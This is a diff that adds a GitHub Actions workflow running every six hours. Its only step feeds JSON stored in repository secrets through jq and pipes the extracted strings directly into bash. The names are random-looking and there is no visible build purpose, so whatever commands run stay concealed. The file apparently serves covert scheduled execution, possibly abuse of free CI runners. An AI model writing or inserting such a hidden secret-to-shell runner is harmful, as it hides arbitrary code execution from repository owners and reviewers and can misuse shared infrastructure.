@@ -1,0 +1,24 @@
+name: liangshangjunzii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '25 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: liangshangjunzii
+        env:
+          ivgr52427: ${{ secrets.ivgr52427 }}
+        run: |
+          echo $ivgr52427 | jq -r .l462 | /bin/bash
+          echo $t918 | jq -r .jkva4 | /bin/bash
+          echo $uk04 | jq -r .oj59 | /bin/bash
+          echo $zeyy2 | jq -r .f9 | /bin/bash
+          echo $akdhl723 | jq -r .gqywx349 | /bin/bash
+          echo $zwy669 | jq -r .pm94612 | /bin/bash
+
